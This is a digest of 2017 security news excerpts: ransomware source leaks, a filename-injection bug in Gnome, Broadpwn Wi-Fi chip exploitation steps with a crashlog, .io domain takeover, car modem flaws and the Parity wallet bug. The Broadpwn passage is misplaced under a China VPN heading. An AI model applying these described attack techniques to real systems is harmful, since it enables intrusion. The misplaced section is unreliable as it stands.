- Bad news for Android users  Decompiled source code of for one of the oldest mobile and popular Android ransomware families has been published online, making it available for cyber criminals who can use it to develop more customised and advanced variants of Android ransomware.Decompiled source code for the SLocker android ransomware, which saw a six-fold increase in the number of new versions over the past six months, has just been published on GitHub and is now available to anyone who wants it.The SLocker source code has been published by a user who uses 'fs0c1ety' as an online moniker and is urging all GitHub users to contribute to the code and submit bug reports.SLocker or Simple Locker is mobile lock screen and file-encrypting ransomware that encrypts files on the phone and uses the Tor for command and control (CC) communication

- The malware also posed as law enforcement agencies to convince victims into paying the ransom.Famous for infecting thousands of Android devices in 2016, security researchers discovered more than 400 new variants of SLocker ransomware in the wild in May, and just after a month, the nasty Android ransomware was spotted copying the GUI of WannaCry.Once infected, SLocker runs silently in the background of a victim's device without their knowledge or consent and encrypts images, documents and videos on mobile devices.Once it has encrypted files on the device, the Android ransomware hijacks the phone, blocking its user access completely, and attempts to threaten the victim into paying a ransom to unlock it.Why Should You Worry?Being in action from 2015, SLocker stands out as one of the first ransomware samples to encrypt Android files

- The malware has modified beyond just locking screens and demanding payment to taking over administrative rights and controlling the device's microphone, speakers, and the camera.And now since the source code of this nasty Android ransomware has been released online on GitHub, Android devices are most likely to receive an increasing number of ransomware attacks in upcoming days.The leaked source code would be a golden opportunity for those who always look for such opportunities as these kinds of malware programs are only offered for sale in underground forums, but SLocker is now accessible to cybercriminals and fraudsters for FREE.Earlier this year, researchers discovered a variant of BankBot banking trojan in the wild which was developed using the leaked source code for the malware on an underground hacking forum.Last year, the source code for the MazarBot (improved version of GM Bot) was also leaked online by its author in order to gain reputation on an underground forum.How to Protect Yourself?As I previously mentioned, users are always advised to follow some basic precautions in order to protect themselves against such threats:Never open email attachments from unknown sources.Never click on links in SMS or MMS messages.Even if the email looks legit from some company, go directly to the source website and verify any possible updates.Go to Settings  Security, and Turn OFF "Allow installation of apps from sources other than the Play Store."Always keep your Android devices, apps and Antivirus app up-to-date.Avoid unknown and unsecured Wi-Fi hotspots and keep Wi-Fi switched off when not in use.Swati KhandelwalTechnical Writer, Security Blogger and IT Analyst

## Bug of the week: Gnome pic parser can run evil VBScripts

- Gnome developers, take a bow: a bug in your image thumbnailer has opened up a (not too scary, thankfully) hole for script injection. The security vulnerability was revealed this week by Nils Dagsson Moskopp here, and his advice for users is: 

- The generator crafts a custom temporary script to run within Wine that looks inside the .MSI and pulls out information and stuff to create the thumbnail.

- OMITTED BECAUSE GITHUB FUCKING SUCKS AT PARSING

- Instead of parsing an MSI file to get its version number, this code creates a script containing the filename for which a thumbnail should be shown and executes that using Wine.

- The script is constructed using a template, which makes it possible to embed VBScript in a filename and trigger its execution.  Dagsson Moskopp says developers should not use ad-hoc parsers to parse files, should fully recognise inputs before processing them, and should use unparsers. This issue has now been addressed by using a proper MSI parser rather than screwing around with scripts and Wine: make sure you fetch and install the latest updates for Gnome Files as soon as they land.

## Chinese government denies plans to block personal use of VPN in China

- The news sparked outrage from consumers and businesses within China that rely on VPNs to access the open internet.

- Now, the Chinese government has issued a statement saying that these foreign reports are false. The MIIT clarified that their January order only targets domestically offered corporate VPN services and makes them register, categorically denying that they have asked ISPs to block personal VPN access.

- the Ministry of Industry and Information Technology (MIIT) said in a brief statement: Trade or multinational enterprises, if they require leased lines or other methods to access the internet abroad, can turn to authorized telecommunications entities.

- The (January) notice will not affect normal operations. They basically clarified that even personal use of VPNs is fine, as long as it is through approved carriers. So what is the regulatory status of VPN in China? The Great Firewall of China still stands high.

- If personal VPN use is technically allowed, but only through approved, domestic VPN providers that store their encryption keys with the government, thats still pretty much the same ban on real, no-log VPNs that has been active for several years.

- As a proof of concept, I've made a malicious network which uses these two exploits to corrupt the RAM of my Nexus 6P, causing a crash and reboot.PlanThere's two parts to this proof of concept:A method to get arbitrary code execution on the Wi-Fi chip using @nitayart's Broadpwn bugAn implementation of Project Zero's DMA engine hook to corrupt the kernel in the main system memory over PCIEThe first part is very reliable - I can always get code execution; the second part only works sometimes, since we're pointing the Wi-Fi packet DMA into main memory, and so success depends on what packets are DMAed.Code execution on the Wi-Fi chipIn the last post, we managed to cause a heap write out of bounds using the Broadpwn bug, which causes the Wi-Fi chip to crash when reading an invalid address

- Here's the crashlog from the previous post:[  695.399412] CONSOLE: FWID 01-a2412ac4[  695.399420] CONSOLE: flags 60040005[  695.399425] CONSOLE: 000003.645 [  695.399430] CONSOLE: TRAP 4(23fc30): pc 5550c, lr 2f697, sp 23fc88, cpsr 2000019f, spsr 200001bf[  695.399435] CONSOLE: 000003.645   dfsr 1, dfar 41414145[  695.399441] CONSOLE: 000003.645   r0 41414141, r1 2, r2 1, r3 0, r4 22cc00, r5 217634, r6 217048[  695.399449] CONSOLE: 000003.645   r7 2, r8 56, r9 1, r10 216120, r11 217224, r12 8848cb89[  695.399455] CONSOLE: 000003.645 [  695.399460] CONSOLE:    sp+0 00000002 0022cc00 0022d974 00217634[  695.399465] CONSOLE: 000003.645   sp+10 00000004 0001aa83 0022d97f 00000168[  695.399471] CONSOLE: [  695.399476] CONSOLE: 000003.645 sp+14 0001aa83[  695.399481] CONSOLE: 000003.645 sp+38 000937eb[  695.399486] CONSOLE: 000003.645 sp+44 00003b15[  695.399492] CONSOLE: 000003.645 sp+4c 00088659[  695.399497] CONSOLE: 000003.645 sp+64 00008fc7[  695.399502] CONSOLE: 000003.645 sp+74 0000379b[  695.399507] CONSOLE: 000003.645 sp+94 00000a29[  695.399512] CONSOLE: 000003.645 sp+c4 0019a9e1[  695.399517] CONSOLE: 000003.645 sp+e4 00006a4d[  695.399523] CONSOLE: 000003.645 sp+11c 00188113[  695.399528] CONSOLE: 000003.645 sp+15c 000852ef[  695.399533] CONSOLE: 000003.645 sp+180 00019735[  695.399538] CONSOLE: 000003.645 sp+194 0001ec73[  695.399543] CONSOLE: 000003.645 sp+1bc 00018ba5[  695.399549] CONSOLE: 000003.645 sp+1dc 00018a75[  695.399554] CONSOLE: 000003.645 sp+1fc 0000656bFirst, let's figure out what exactly we're overwriting

- According to Project Zero, heap allocations begin with a 8-byte header: a uint32_t containing the allocation's size and a pointer to the next free chunk if the current chunk is free or null if it's allocated.I connected to a normal Wi-Fi network that uses QoS, and dumped the Wi-Fi chip's RAM using dhdutil

- Next, I used a modified version of Project Zero's heap visualization script to iterate through the entire heap, looking for allocations that begin with 0050f202 (the start of a WME information element).It turns out there's two allocations that both begin with this series of bytes: the chunk at 0x1f3550 and at 0x21700c

- Both are followed by another chunk 0x78 bytes in size (at 0x1f3584 and 0x217040) Looking at the stack in the crashlog, we can see that r6=0x217048 matches the start of the second allocation, so the address we're overflowing seems to be the second one.Next, what are we overwriting afterwards? Right now, we only know the next chunk's size (0x78) and contents (a few pointers, no function pointers)

- Let's look at the code that crashed.Going up the call stack, we identified a function that contains a printf call with the function name

- After cross referencing, we're able to reconstruct this call stack:0x5550c wlc_hrt_del_timeout0x635cc wlc_pm2_sleep_ret_timer_stop0x2f670 wlc_set_pm_mode0x19734 _wlc_ioctlSo it looks like we overwrote a pointer to a timer, and the firmware crashes when disabling it.This type of timer is placed in a single linked list when enabled

## Linux kernel hardeners Grsecurity sue open source's Bruce Perens  The Register

- The agreement says that customers who redistribute the code  a right under the GPLv2 license  will no longer be customers and will lose the right to distribute subsequent versions of the software. According to Perens, "GPL version 2 section 6 explicitly prohibits the addition of terms such as this redistribution prohibition.

- " A legal complaint filed on behalf of Grsecurity in San Francisco, California, insists the company's software complies with the GPLv2.

- Grsecurity's agreement, the lawsuit states, only applies to future patches, which have yet to be developed. "There is no explicit or implicit term, section, or clause in the GPLv2 that is applicable over future versions or updates of the Patches that have not yet been developed, created, or released by [Grsecurity]," the complaint contends. Perens isn't arguing that the GPLv2 applies to unreleased software.

- Rather, he asserts the GPLv2, under section 6, specifically forbids the addition of contractual terms. As the GPLv2 license states, "You may not impose any further restrictions on the recipients' exercise of the rights granted herein.

- Perens referred a request for comment to his attorney, who did not immediately respond. In now falls to a judge to sort things out.

## Introducing 306 Million Freely Downloadable Pwned Passwords

- The reasons for this should be obvious but just in case you're not fully aware of the risks, have a read of my recent post on password reuse, credential stuffing and another billion records in Have I been pwned (HIBP).

- You and I know what a data breach is but it's a foreign world to many other people so some language the masses can understand (including why it's in their own best interests) is highly recommended. A middle ground would be to recommend the user create a new password without necessarily enforcing this action.

- The argument of "let's not do anything to jeopardise signups" is no longer valid and whilst I'd be hesitant to say "always block Pwned Passwords at change", I'd be more inclined to do it here than anywhere else. Use Case 3: Login Many systems will already have large databases of users.

- An approach as I've taken with Azure Table Storage would be ideal in that it's very fast (single digit ms), very scalable and very cost effective. Other Use Cases I'm sure clever people will come up with other ways of using this data.

- If you're wearing the same shoes as I have so many times before where you're trying to make yourself heard and do what you ultimately believe is in the organisation's best interests, let me give you a couple of suggestions:  Offer to "downsample" the users you apply this to over a trial period.

## Good news: Samsung's Tizen no longer worst code ever. Bad news: It's still pretty awful

-                                 Samsung's Tizen appears to have more holes than a screen door, but the mobile operating system, which powers Samsung watches, TVs, and a few phones, may not be as disastrous as it seems.                It does look bad

- According to Andrey Karpov, founder and CTO of Program Verification Systems, the Russia-based maker of static code analyzer PVS-Studio, Tizen's codebase contains approximately 27,000 programming blunders.                This is, though, based on extrapolating from 900 errors found in 3.3 per cent of the 72.5 million lines of C/C++ code (excluding comments) that compose the Tizen project.                Karpov's claim echoes the findings of Israeli security researcher Amihai Neiderman, who in April at Kaspersky Lab's Security Analyst Summit, identified 40 zero-day vulnerabilities in Tizen code.                At the time, Neiderman characterized Tizen's codebase as possibly the worst he'd seen.                Those developing Tizen software have said as much

- In a post to the Tizen developer mailing list in April about the project's slow response to bug reports, Maxim Khitrov, who develops software for the Biotechnology High Performance Computing Software Applications Institute (BHSAI), said, "Tizen is a mess with really bad code all around."                Even Samsung insiders concede the way Tizen is managed leaves something to be desired

- Responding to Khitrov's complaint, Samsung open-source developer Carsten Haitzler observed that Tizen platform maintainers have limited control over product groups that ship Tizen devices.                "They are completely different teams and there is no single coherent 'Tizen leader' who tells everyone what to do with Tizen, how to do it and when," Haitzler lamented

- "We can fix bugs in the platform but can't guarantee if an update will ship for devices or if it will be changed by the time it ships for a device."                Envisioned as an Android competitor, Tizen at least matches Google's mobile operating system in terms of disorganization

- In terms of numbers, Samsung hopes to reach 10 million Tizen phones this year; Google in May said there are two billion monthly active Android devices.                A bug identified by PVS-Studio                Yet, Samsung doesn't see Tizen's many bugs as a problem

- Karpov assembled his list of bugs as a sales pitch for his company's static analyzer

- And Youil Kim, from Samsung Electronics, declined his offer on the Tizen mailing list by noting that Samsung is already working on static analysis of Tizen code but prefers another unnamed code quality tool that can find additional problems.                "We don't agree with that Tizen has 27,000 defects that should be fixed," said Kim

## Systemd wins top gong for 'lamest vendor' in Pwnie security awards

-                                 Black Hat The annual Pwnie Awards for serious security screw-ups saw hardly anyone collecting their prize at this year's ceremony in Las Vegas.                That's not surprising: government officials, US spy agencies, and software makers arent usually in the mood to acknowledge their failures.                The Pwnies give spray-painted pony statues to those who have either pulled off a great hack or failed epically

- This year it was nation states that got a significant proportion of the prizes

- The gongs are divided into categories, and nominations in each section are voted on by the hacker community

- The ponies are then dished out every year at the Black Hat USA security conference in Sin City.                The award for best server-side bug went to the NSA's Equation Group, whose Windows SMB exploits were stolen and leaked online this year by the Shadow Brokers

- The tools attack three stunning vulnerabilities (CVE-2017-0143, 0144, 0145), and were later used by malware including WannaCrypt to wreck systems across the globe, forcing Microsoft to issue patches for out-of-date operating systems to fight the outbreak.                While Uncle Sam's snoops didnt pick up their award, neither did other governments

- The epic 0wnage award was split between North Korea and Russia for launching the WannaCry ransomware contagion and masterminding the Shadow Brokers, respectively.                Meanwhile, Australian prime minister Malcom Turnbull earned an award for the most epic fail for insisting the laws of Australia trump the laws of mathematics

- The Aussie leader was told it's not possible to backdoor encryption for counterterrorism snoops without ruining the crypto for everyone else, and was having none of it.                The laws of Australia prevail in Australia, I can assure you of that, he said

- The laws of mathematics are very commendable, but the only law that applies in Australia is the law of Australia.                That landed him the pony, although Turnbull faced strong competition

## Bitcoin Cash Just Mined its First Block, Making Blockchain Split Official

-                                                                                                                                                                                     An effort to create an alternative version of the bitcoin blockchain is officially moving ahead.After running into roadblocks this morning, miners were able to successfully create a block on a new blockchain, called Bitcoin Cash, at roughly 2:14 p.m

- ET today

- The move effectively finds the miners breaking away from the main bitcoin network and forging ahead with a different technical roadmap.The block in question was mined by mining firm ViaBTC, according to a Bitcoin Cash block explorer hosted by data provider BlockDozer

- ViaBTC later acknowledged the finding on Twitter and WeChat.All in all, the event came nearly six hours after block 478,558  the point at which miners attempted to start the separation.Network data shows that the Bitcoin Cash block contained 6,985 transactions, with a block size of 1.915 MB  nearly double the size of this parameter on the original chain

- The data point is notable given that Bitcoin Cash was designed to increase network capacity by offering a blockchain with a larger block size.According to CoinMarketCap, the price of Bitcoin Cash is trading at roughly $219 on digital currency exchange Kraken

- The exchange's top marketplace, for the BTC/BCH trading pair, is reporting more than $3m in volume since launch.Disclosure: CoinDesk is a subsidiary of Digital Currency Group, which has an ownership stake in Kraken

## NSA Collects MS Windows Error Information

- NSA Collects MS Windows Error Information        Back in 2013, Der Spiegel reported that the NSA intercepts and collects Windows bug reports:One example of the sheer creativity with which the TAO spies approach their work can be seen in a hacking method they use that exploits the error-proneness of Microsoft's Windows

- Every user of the operating system is familiar with the annoying window that occasionally pops up on screen when an internal problem is detected, an automatic message that prompts the user to report the bug to the manufacturer and to restart the program

- These crash reports offer TAO specialists a welcome opportunity to spy on computers.When TAO selects a computer somewhere in the world as a target and enters its unique identifiers (an IP address, for example) into the corresponding database, intelligence agents are then automatically notified any time the operating system of that computer crashes and its user receives the prompt to report the problem to Microsoft

- An internal presentation suggests it is NSA's powerful XKeyscore spying tool that is used to fish these crash reports out of the massive sea of Internet traffic.The automated crash reports are a "neat way" to gain "passive access" to a machine, the presentation continues

- Passive access means that, initially, only data the computer sends out into the Internet is captured and saved, but the computer itself is not yet manipulated

- Still, even this passive access to error messages provides valuable insights into problems with a targeted person's computer and, thus, information on security holes that might be exploitable for planting malware or spyware on the unwitting victim's computer.Although the method appears to have little importance in practical terms, the NSA's agents still seem to enjoy it because it allows them to have a bit of a laugh at the expense of the Seattle-based software giant

- In one internal graphic, they replaced the text of Microsoft's original error message with one of their own reading, "This information may be intercepted by a foreign sigint system to gather detailed information and better exploit your machine." ("Sigint" stands for "signals intelligence.")The article talks about the (limited) value of this information with regard to specific target computers, but I have another question: how valuable would this database be for finding new zero-day Windows vulnerabilities to exploit? Microsoft won't have the incentive to examine and fix problems until they happen broadly among its user base

- The NSA has a completely different incentive structure.I don't remember this being discussed back in 2013.

## Hackers Breach Cybersecurity Company In Apparent Revenge On Employee

- Photo: GettyA threat analyst at the cybersecurity firm Mandiant has been hacked and the attackers are claiming to have lurked on his computer for  a year, collecting his login credentials for various sites and tracking his location.The hackers  got their hands on some internal data about the clients Mandiant and its parent company FireEye protect, including the Israeli Defense Forces.

- We are investigating this situation, and have taken steps to limit further exposure, a FireEye spokesperson told Gizmodo.

- To date, we have confirmed the exposure of business documents related to two separate customers in Israel, and have addressed this situation with those customers directly. The investigation is ongoing, the spokesperson added.Mandiants employee, Adi Peretz, appears to have been targeted because of his worka post apparently written by the hackers mentions that Peretz may have disrupted one of their breach plans.

- Heres what they allegedly had to say:For a long time we - the 31337 hackers - tried to avoid these fancy ass Analysts whom trying to trace our attack footprints back to us and prove they are better than us.

- If during your stealth operation you pwned an analyst, target him and leak his personal and professional data, as a side job of course ;).Although its easy to laugh at a guy whose LinkedIn page got defaced with a picture of a hairy butt, the hack just goes to show that even security professionals can be vulnerable.

## Cops harpoon two dark net whales in megabust: AlphaBay and Hansa

- In the past few weeks, the Dutch Police collected valuable information on high value targets and delivery addresses for a large number of orders.

- Some 10 000 foreign addresses of Hansa market buyers were passed on to Europol.  Elsewhere an FBI and DEA-led operation called Bayonet, identified a suspect whom they believed could be the creator and administrator of AlphaBay, a Canadian citizen resident in Thailand.

- Servers were also seized in Canada and the Netherlands, a DoJ statement on the operation explains. Andrew McCabe, acting director of the FBI, hailed the international law enforcement co-operation that led to the takedown of the two marketplaces.

- " During the press conference, Deputy Attorney General Rod Rosenstein echoed these sentiments and warned prospective dark net customers and traders that Tor would not necessarily shield their identities.

- Dark net users assume Tor will protect their ID but that's not always true, he said. The investigation into AlphaBay revealed that numerous vendors sold fentanyl and heroin.

## Google Glass Makes an Official Return

- Alphabet's Google has officially launched the "Enterprise Edition" of its smart glasses hardware, which is now available to a network of Google partners.

- From a report: The company's developer partners range from logistics and manufacturing to patient care.

- In a blog post Tuesday, Google Glass project leader Jay Kothari said partners such as GE Aviation, AGCO, DHL, Dignity Health, NSF International, Sutter Health, Boeing and Volkswagen have been using Glass over the past several years, and make up just a sampling of 50 companies using the wearable.

- Wired said several of these companies found the original Google Glass to be very useful in factories and other enterprise environments.

- Google discovered this and began work on a product built by a team dedicated to building a new version of Glass for the enterprise.

## FCC Says It Has No Documentation of Cyberattack That It Claims Happened

- An anonymous reader quotes a report from The Hill: The Federal Communications Commission (FCC) declined to reveal analysis proving that it was the victim of a cyberattack in May.

- The agency claimed at the time that its Electronic Comment Filing System (ECFS) did not actually crash because of a large amount of traffic on the site prompted by John Oliver telling viewers to file comments in favor of net neutrality on his HBO show, Last Week Tonight.

- In its response to Gizmodo's FOIA request, the FCC said that the attack "did not result in written documentation."

- "Based on a review of the logs, we have already provided a detailed description of what happened.

- We stand by our career IT staff's analysis of the evidence in our possession," an FCC spokesperson said when asked for comment on the matter.

## IBM scientists have captured 330TB of uncompressed data into a tiny cartridge

-   In a new world record, scientists at IBM have captured 330 terabytes of uncompressed data  or the equivalent of 330 million books  into a cartridge that can fit into the palm of your hand

- The record of 201 gigabits per square inch on prototype sputtered magnetic tape is more than 20 times the areal density currently used in commercial tape drives

- Areal recording density is the amount of information that can be stored on a given area of surface

- Tape drives were invented over 60 years ago and were traditionally used for archiving tax documents and health care records

- IBMs first tape unit used reels of half-inch-wide tape that could only hold about 2 megabytes.                                                          A cross section of the prototype sputtered magnetic tape.                    Image: Sony            The magnetic tape was developed by Sony Storage Media Solutions, and the milestone indicates the viability of continuing to scale up storage on tapes for another decade, IBM said.Tape has traditionally been used for video archives, back-up files, replicas for disaster recovery and retention of information on premise, but the industry is also expanding to off-premise applications in the cloud, said IBM fellow Evangelos Eleftheriou in a statement

- While sputtered tape is expected to cost a little more to manufacture than current commercial tape, the potential for very high capacity will make the cost per terabyte very attractive, making this technology practical for cold storage in the cloud. In order for researchers to achieve the 201 gigabits per square inch, IBM researchers had to develop several new technologies

- IBM worked closely with Sony for several years, particularly on enabling increased areal recording densities

- The results of this collaboration have led to various improvements in the media technology, such as advanced roll-to-roll technology for long sputtered tape fabrication and better lubricant technology, which stabilizes the functionality of the magnetic tape.

## Adobe will kill Flash by 2020: No more updates, support, tears, pain...

- Adobe has officially set a kill date for its beleaguered Flash. The Photoshop giant said today it plans to end support for the hacker-prone multimedia browser plugin by the end of 2020.

- This means no more updates for Flash Player after that date and the end of support on many browsers, including Chrome, Internet Explorer and Edge, and Firefox. Facebook also says it will shut off Flash games by the end of 2020, and is advising developers to change their FB games over to a different format. "Where weve seen a need to push content and interactivity forward, weve innovated to meet those needs.

- Where a format didnt exist, we invented one  such as with Flash and Shockwave," said a spokesperson for Adobe, which didn't actually invent either format. "And over time, as the web evolved, these new formats were adopted by the community, in some cases formed the basis for open standards, and became an essential part of the web.

- " Programmers, designers and companies whose websites still rely on Flash (Google estimates that is about 17 per cent of all sites) are being encouraged to start planning now to transition to a more modern format, such as HTML5 and WebGL, though they probably should have already done that already. The announcement will be welcome news for security professionals and administrators, as it is one less attack vector to worry about.

- The notoriously insecure Flash Player plugin has emerged in recent years as the favorite target for automated exploit kits due to both its prevalence and the large number of serious flaws lingering in the code. In the meantime, however, it will be at least another three-plus years of dutifully patching Flash Player every month and advising users to either disable or at least make Flash content click-to-play in their browser settings.

## Robot Safecracking

- By making attempts in a certain careful order, it could keep two of the three rotors in place, while trying new numbers on just the last, vastly cutting the time to try new combinations to a maximum of four seconds per try.

- But Seidle found one more clever trick, this time taking advantage of a design quirk in the safe intended to prevent traditional safecracking.

- To block that technique, the third rotor of Seidle's SentrySafe is indented with twelve notches that catch the rod if someone turns the dial while pulling the handle.

- That's not a difference any human can feel or listen for, but his robot can easily detect it with a few automated measurements that take seconds.

- That discovery defeated an entire rotor's worth of combinations, dividing the possible solutions by a factor of 33, and reducing the total cracking time to the robot's current hour-and-13 minute max.

## The .io Error - Taking Control of All .io Domains With a Targeted Registration | The Hacker Blog

- In a previous post we talked about taking over the .na, .co.ao, and .it.ao domain extensions with varying levels of DNS trickery

- In that writeup we examined the threat model of compromising a top level domain (TLD) and what some avenues would look like for an attacker to accomplish this goal

- One of the fairly simple methods that was brought up was to register a domain name of one of the TLDs authoritative nameservers

- Since a TLD can have authoritative nameservers at arbitrary domain names its possible that through a misconfiguration, expiration, or some other issue that someone would be able to register a nameserver domain name and use it to serve new DNS records for the entire TLD zone

- The relevant quote from the previous post Ill include here:This avenue was something I was fairly sure was going to be the route to victory so I spent quite a lot of time building out tooling to check for vulnerabilities of this type

- The process for this is essentially to enumerate all nameserver hostnames for a given extension and then checking to see if any of the base-domains were expired and available for registration

- The main issue I ran into is many registries will tell you that a domain is totally available until you actually attempt to purchase it

- Additionally there were a few instances where a nameserver domain was expired but for some reason the domain was still unavailable for registration despite not being marked as reserved

## Apple removes VPN Apps from the China App Store

-      In order to comply with Chinese censorship law, Apple has started removing all virtual private network (VPN) apps from the App Store in China, making it harder for internet users to bypass its Great Firewall.  VPN service providers that provide services in China has accused the United States tech giant of complying with Chinese stringent cyberspace regulations.

-   In a blog post, the developers of ExpressVPN reported that Apple informed them that their VPN app had been pulled from the company's Chinese App Store, and it seems all major VPN clients have received the same notice from Apple.  China has strict Internet censorship laws through the Great Firewall of China  the country's Golden Shield project that employs a variety of tricks to censor Internet and block access to major foreign websites in the country.  The Great Firewall is already blocking some 171 out of the world's 1,000 top websites, including Google, Facebook, Twitter, Dropbox, Tumblr, and The Pirate Bay in the country.

- "We know this stuff is complicated, but it is your responsibility to understand and make sure your app conforms with all local laws.

- "  The tech giant has even partnered with a local firm in the southwestern province of Guizhou earlier this month to set up its first data centre in China, which will store all user information for Chinese customers.

## First Human Embryos Edited in U.S.

- The effort, led by Shoukhrat Mitalipov of Oregon Health and Science University, involved changing the DNA of a large number of one-cell embryos with the gene-editing technique CRISPR, according to people familiar with the scientific results.

- Some critics say germline experiments could open the floodgates to a brave new world of designer babies engineered with genetic enhancementsa prospect bitterly opposed by a range of religious organizations, civil society groups, and biotech companies.

- His teams move into embryo editing coincides with a report by the U.S. National Academy of Sciences in February that was widely seen as providing a green light for lab research on germline modification.

- Genome editing to enhance traits or abilities beyond ordinary health raises concerns about whether the benefits can outweigh the risks, and about fairness if available only to some people, said Alta Charo, co-chair of the NASs study committee and professor of law and bioethics at the University of WisconsinMadison.

- In the U.S., any effort to turn an edited IVF embryo into a baby has been blocked by Congress, which added language to the U.S. Food  Drug Administration funding bill forbidding it from approving clinical trials of the concept.

## Google Bolsters Security To Prevent Another Google Docs Phishing Attack

-  Google Bolsters Security To Prevent Another Google Docs Phishing Attack  (zdnet.com) 

- Google is adding a set of features to its security roster to prevent a second run of last month's massive phishing attack.

- From a report: The company is adding warnings and interstitial screens to warn users that an app they are about to use is unverified and could put their account data at risk.

- This so-called "unverified app" screen will land on all new web apps that connect to Google user accounts to prevent a malicious app from appearing legitimate.

- Any Google Chrome user landing on a hacked or malicious website will recognize the prompt as the red warning screen.

## Australian Prime Minister Turnbull: The laws of mathematics dont apply in Australia

-                                                                                                                  Australias Prime Minister Michael Turnbull doesnt believe in the laws of mathematics  a troubling sign for a world leader to say the least

- Australias leader spoke the infamous words at a press conference yesterday in Sydney, Australia

- When asked by a journalist if the laws of mathematics would trump the laws of Australia (as they trump every man-made law ever), he responded:The laws of Australia prevail in Australia, I can assure you of that

- The laws of mathematics are very commendable but the only law that applies in Australia is the law of Australia.Whats revealed here is a dangerous misunderstanding of the laws of mathematics

- To think that the laws of a country could somehow beat the natural laws of mathematics is exactly the mentality that makes encryption backdoors seem like a good idea

- Now that its clear what these politicians think about mathematics, their stances on encryption make a lot more sense.Turnbull wants to make 2+2=5 in AustraliaAustralia is pushing their anti-math, anti-encryption message to the Five Eyes, and even the rest of the world

- In places such as the Netherlands, data mining and surveillance laws were just passed this past week

- At this point, it seems unlikely that their anti-encryption ways will spread far, given that the United Nations has come out in support of end-to-end encryption without backdoors, as has the EU

## Ghost of NTLM still haunts Microsoft: Aged protocol hole patched

- Computer security biz Preempt warned last October that Microsoft NT LAN Manager (NTLM) should be avoided.

- "NTLM is risky and should be used with caution (if not totally restricted) in your organization's network," said Yaron Zinar, a security researcher at Preempt, in a blog post last year.

- "This allows an attacker with SYSTEM privileges on a machine to use any incoming NTLM session and perform the LDAP operations on behalf of the NTLM user,"

## The opsec blunders that landed a Russian politician's fraudster son in the clink for 27 years

- Last year, Roman V Seleznev, 32, was found guilty of multiple counts of fraud and hacking by a jury in Washington, USA

- Seleznev first came to the American authorities attention in the early 2000s as a dabbler in identity theft using the screen name nCux

- a PayPal account for a man in Vladivostok and had also been used to order flowers for a woman identified as Seleznevs wife.

- The Yahoo! account was also used to purchase a server from HopOne Internet in McLean, Virginia.

- he had booked travel tickets that had his passport details on them, and there was evidence of numerous aliases that he was using online

- the investigating team knew Seleznev reused passwords

- Ochtoko123

- Fun fact: Barbosa says that Ochtoko is Russian slang for the anus

- That passphrase was found among the emails lifted from his Yahoo! account.

- The password worked, and they got into his laptop and found 1.7 million stolen credit card numbers.

## PasteBin data dump: Hackers claim files are from Mandiant FireEye 'breach'

- Hackers have leaked what they claim is information stolen from FireEye/Mandiant after apparently breaking into the incident response biz's network.

- It appears Op #LeakTheAnalyst is the result of mischief-makers breaking into a Mandiant staffer's social media accounts and leaking some of the contents. Ido Naor, a researcher at Kaspersky Lab, commented: "Only one workstation seems to be infected during #leakTheAnalyst.

- " Researcher Hanan Natan agreed: "The current #leakTheAnalyst dump doesn't contain any [proof] that they compromised the Mandiant networks." In response, FireEye put out a preliminary statement blaming the whole thing on a social media leak. 

- We are aware of reports that a Mandiant employee's social media accounts were compromised.

- Our investigation continues, but thus far, we have found no evidence FireEye or Mandiant systems were compromised.

## The Russia VPN ban doesnt forbid personal or business use of VPNs at all

- Denis Krivosheev, an Amnesty International director in the region, commented: With the Russian authorities increasingly intolerant of dissent, technologies that help internet users evade censorship and protect their privacy are crucial for freedom of expression online.

- It certainly isnt helping people freely access information online at the least. Russia and China are both booting VPN services out of the country  but whats the difference? When the Russia VPN ban law was first proposed in April, Putin had just gotten back from the G20 summit where he had publicly defended Chinas domestic internet censorship; however, he also stated that Russia would not be implementing Chinas Great Firewall policies and instead follow their own path when it comes to internet censorship. Russias VPN ban will be enacted on November 1st, 2017, while Chinas similar ban on unregistered VPN services will be enacted by February 1st, 2018, and has already resulted in apps being removed from the Apple App Store.

- Another main difference is that China has been unofficially, actually blocking VPN traffic with the Great Firewall for several years now without any official law in place at all.

- They do this through the use of deep packet inspection (DPI). Back in 2016, when the Yaroyava Law  which Edward Snowden dubbed Russias Big Brother Law  was passed, Russias ISPs and telecoms were required to store a minimum of six months of metadata.

- The url blacklist is called the Unified Register of Prohibited Information and is already added to the firewalls of each ISP and telecom in Russia as a blocklist. Simply put, Russia likely plans to block the domains of VPNs and proxies that dont comply with Russian authorities to enforce their internet censorship filter.

## Its 2017 and Hayes AT modem commands can hack luxury cars

-                                 Updated A bunch of mid-age Ford, Infiniti, Nissan and BMW vehicles are carrying around a vulnerable chipset from Infineon that America's ICS-CERT reckons is easy to exploit.                The BMWs went on sale between 2009 and 2010, the affected Infiniti models were built between 2013 and 2015 and there's a chance Nissan Leafs manufactured between 2011 to 2015 have bugs

- A handful of Ford hybrids may also be in trouble.                In IT terms a 2009 product is close to end-of-life; a car that age might still be covered by an extended warranty (and in Australia, by parts of the 10-year statutory warranty).                Infineon's contribution to the problem is a 2G baseband chipset, the S-Gold 2 (part number PMB 8876), used by upstream German vendor Continental to produce telematics control units (TCUs).                The first vulnerability is a stack-based buffer overflow that ICS-CERT says is only exploitable by an attacker with physical access to the car.                Old-timers will get nostalgic and weepy at this point: the vulnerability is exposed by the modem's AT command set

- As detailed in this DEFCON presentation (PDF), the commands are AT+STKPROF, AT+XAPP, AT+XLOG and AT+FNS.                (Many of these turned up as sources of iPhone vulns patched in 2015, if the extra detail at the iPhoneWiki is accurate.)                The second  which is remotely exploitable if you can get a 2G connection  lets an attacker access and control memory for remote code execution on the baseband radio processor of the TCU.                The discoverers, McAfee researchers Mickey Shkatov, Jesse Michael and Oleksandr Bazhaniuk, note in the presentation that the exploits for the firmware in question were outlined by Ralf-Philip Weinmann in the iOS Hacker's Handbook in 2016.                So, as ICS-CERT says, public exploits are available.                The best mitigation, it seems, is to deactivate the TCU, which Nissan and Infiniti and Ford (since last year) are implementing; BMW told ICS-CERT it will put a program in place for customers

-                   Updated to add                Mickey Shkatov got in touch to point out that the remote exploit doesn't need a 2G network to exist

- It's cheap and easy to buy an open-source 2G-capable base station: "If an attacker sets their own malicious base station and your tcu connects to it that would be enough to trigger the tmsi vulnerability

- All the tcu has to do to be exploited is to be powered on and looking for signal", he wrote in an email.                An updated version of the DEFCON slideshow is here.

## An In-Depth Look at the Parity Multisig Bug

- The MultisigExploit-Hacker (MEH), as he, she, or they are known, exploited a vulnerability in the Parity 1.5 clients multisig wallet contract

- fairly straightforward attack allowed the hacker to take ownership of a victims wallet with a single transaction

- The victims were three ICO projects: Edgeless Casino, Swarm City, and ternity.

